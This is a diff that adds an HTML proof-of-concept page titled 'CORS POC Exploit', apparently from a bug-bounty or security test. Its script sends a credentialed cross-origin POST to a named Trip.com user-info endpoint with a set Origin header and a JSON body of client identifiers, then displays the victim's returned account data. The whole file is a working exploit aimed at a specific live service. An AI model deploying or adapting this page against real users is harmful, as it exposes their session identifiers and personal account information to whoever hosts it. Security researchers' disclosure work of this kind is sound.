@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h2>CORS POC Exploit</h2>
+<h3>Extract SID</h3>
+ 
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+ 
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+
+  xhttp.onreadystatechange = function () {
+    if (this.readyState == 4) {
+      if (this.status == 200) {
+        try {
+          const json = JSON.parse(this.responseText);
+          alert("Success:\n" + JSON.stringify(json, null, 2));
+          // Optional: Show in page
+          document.getElementById("demo").innerText = this.responseText;
+        } catch (err) {
+          alert("Invalid JSON:\n" + this.responseText);
+        }
+      } else {
+        alert("Request failed with status " + this.status);
+      }
+    }
+  };
+
+  xhttp.open("POST", "https://sa.trip.com/restapi/soa2/27024/getUserInfo", true);
+  xhttp.withCredentials = true;
+
+  // Set headers
+  xhttp.setRequestHeader("Content-Type", "application/json");
+  xhttp.setRequestHeader("Origin", "https://hubspotqa.in.trip.com");
+
+  // Set JSON body
+  const body = {
+    "locale": "en-SA",
+    "accessCode": "IBUPCAUTEHNTICATE",
+    "head": {
+      "cid": "09034126419124608784",
+      "ctok": "",
+      "cver": "1.0",
+      "lang": "01",
+      "sid": "8888",
+      "syscode": "09",
+      "auth": "",
+      "xsid": "",
+      "extension": [],
+      "Locale": "en-SA",
+      "Language": "en",
+      "Currency": "SAR",
+      "ClientID": "09034126419124608784"
+    }
+  };
+
+  xhttp.send(JSON.stringify(body));
+
+  console.log("Request sent");
+}
+</script>
+
+ 
+</body>
+</html>
